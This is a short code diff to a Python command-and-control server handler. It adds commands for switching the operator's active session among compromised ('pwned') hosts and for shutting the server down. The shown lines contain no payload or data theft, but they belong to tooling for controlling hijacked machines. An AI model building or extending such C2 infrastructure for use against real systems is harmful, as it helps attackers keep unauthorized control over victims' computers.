@@ -95,7 +95,18 @@ class C2Handler(BaseHTTPRequestHandler):
                                 print(key, "-", value)
                         print("\nYour active session:", print_last, sep="\n")
                     elif cmd.startswith(C2Commands.SERV_CTRL.value):
-                        pass
+                        try:
+                            possible_new_session = int(cmd.split()[2])
+                            if possible_new_session in pwned_dict:
+                                active_session = possible_new_session
+                                print(f"Waiting for {pwned_dict[active_session]} to wake up.")
+                            else:
+                                raise ValueError
+                        except (ValueError, IndexError):
+                            print(f"You must enter a proper pwned id. Use {C2Commands.SERV_SH_CLS.value} command.")
+                    elif cmd.startswith(C2Commands.SERV_EXT.value):
+                        print("The C2 server has been shut down.")
+                        server.shutdown()
                 else:        
                     try:
                         self.http_response(HTTPStatusCode.OK.value)
